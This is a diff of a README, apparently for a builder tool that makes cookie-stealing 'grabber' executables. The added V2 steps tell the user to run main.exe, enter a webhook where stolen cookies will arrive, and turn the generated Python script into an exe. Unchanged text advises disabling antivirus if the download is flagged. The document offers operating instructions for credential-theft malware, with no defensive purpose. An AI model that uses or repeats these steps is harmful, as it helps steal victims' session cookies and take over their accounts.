@@ -8,7 +8,7 @@ Download the zip file and uncompress it.
 It **shouldn't** be flagged by your antivirus but if it is just disable it.
 
 
-# Instructions
+# Instructions (V1)
 *View pictures at the bottom for help*
 
 How to use 
@@ -20,6 +20,16 @@ How to use
 5. **If setup.exe takes longer than 30 seconds, go to GrabberSetup --> help --> BackupSetup (LAST RESORT) and run that**
 6. Run steps 2-4 again.
 7. That is the simplified version and it should load quicker but you won't get as many features.
+
+# Instructions (V2)
+*View pictures at the bottom for help*
+
+How to use 
+1. Run main.exe
+2. Wait about 10 seconds while it loads all of the requirements in.
+3. Put in the name of your grabber.
+4. Put in the webhook from the channel you want to receive cookies from.
+5. When it is complete check the same directory as the setup for a grabber python script that you can convert to exe.
 
 # Features V1
 
